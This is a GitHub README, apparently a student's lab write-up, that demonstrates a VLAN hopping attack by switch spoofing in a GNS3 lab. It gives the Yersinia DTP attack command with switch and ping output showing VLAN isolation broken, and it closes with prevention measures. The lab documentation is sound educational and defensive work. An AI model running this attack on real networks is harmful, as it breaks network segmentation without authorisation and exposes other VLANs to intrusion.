# 🔀 VLAN Hopping Attack — Switch Spoofing

> Bypassing VLAN segmentation using DTP packets to obtain a Trunk Link via Yersinia

![Attack](https://img.shields.io/badge/Attack-VLAN%20Hopping-red?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-Yersinia-orange?style=flat-square)
![Layer](https://img.shields.io/badge/Layer-2-blue?style=flat-square)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)

---

## 📌 Overview

This project demonstrates a **VLAN Hopping Attack** via **Switch Spoofing** — a Layer 2 attack where the attacker tricks a switch into believing their device is another switch, obtaining a Trunk Link and gaining access to all VLANs on the network.

The attack was executed using **Yersinia** to send DTP (Dynamic Trunking Protocol) packets, tested in a GNS3 lab environment.

---

## 🎯 Objectives

- Understand VLAN segmentation and its limitations
- Exploit DTP to convert an Access port to a Trunk port
- Gain unauthorized access to all VLANs on the network
- Demonstrate why disabling Auto-Trunking is critical

---

## ⚔️ How the Attack Works

| Step | Action | Result |
|------|--------|--------|
| 1 | Attacker (Kali) placed in VLAN 12 | Cannot reach other VLANs |
| 2 | Yersinia sends DTP packets to switch | Switch receives fake "switch" negotiation |
| 3 | Switch converts port to Trunk mode | Attacker port now carries all VLANs |
| 4 | Attacker pings victim in VLAN 1 | Ping succeeds — VLAN isolation broken |

---

## 🖥️ Lab Environment

| Device | OS | Role |
|--------|-----|------|
| Attacker | Kali Linux | Sends DTP packets via Yersinia |
| Victim | Metasploitable 2 | Target in separate VLAN |
| Switch | GNS3 Cisco Switch | Main switch with DTP enabled |

All devices connected via **GNS3 virtual network**.

---

## 🛠️ Technologies Used

| Tool | Purpose |
|------|---------|
| Yersinia | DTP packet injection tool |
| GNS3 | Network simulation environment |
| Kali Linux | Attacker machine |
| Metasploitable 2 | Victim machine |
| Cisco Switch (GNS3) | Target switch with Auto-Trunking |

---

## 🚀 Attack Execution

### Step 1 — Verify VLAN Isolation

```bash
# From Kali (VLAN 12) — ping Metasploitable (VLAN 1)
ping 192.168.231.139
# Result: Destination Host Unreachable
```

### Step 2 — Check Switch Trunk Status

```
Switch# show interface trunk
# Result: No trunk ports — isolation confirmed
```

### Step 3 — Launch DTP Attack with Yersinia

```bash
sudo yersinia dtp -attack 1
```

### Step 4 — Verify Trunk Port Created

```
Switch# show interface trunk
Port    Mode    Encapsulation  Status    Native vlan
Et0/1   auto    n-802.1q       trunking  1
```

### Step 5 — VLAN Isolation Broken

```bash
# From Kali — ping Metasploitable again
ping 192.168.231.139
# Result: 64 bytes from 192.168.231.139 — SUCCESS ✅
```

---

## 📊 Results

- ✅ Successfully sent DTP packets using Yersinia
- ✅ Switch port converted from Access to Trunk mode
- ✅ Gained access to all VLANs (1, 10, 12)
- ✅ Cross-VLAN ping confirmed — attack successful

---

## 🛡️ Prevention

- **Disable DTP** on all access ports: `switchport nonegotiate`
- **Manually configure** all ports as Access or Trunk — never leave on Auto
- **Disable unused ports** and assign them to an unused VLAN
- Enable **BPDU Guard** and **Root Guard** on access ports

---

## 📁 Project Structure

```
vlan-hopping-attack/
├── README.md                    # Project documentation
└── report/
    └── VLAN_Hopping_Report.pdf  # Full lab report with screenshots
```

---

## ⚠️ Disclaimer

This project was developed strictly for educational purposes in a controlled GNS3 lab environment. Do not use against networks you do not own or have explicit permission to test.

---

## 👤 Author

**Ahmad** — Cybersecurity & Networking Student

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/fadi-morad-775384381)
[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/Ahmad-Cyber8)
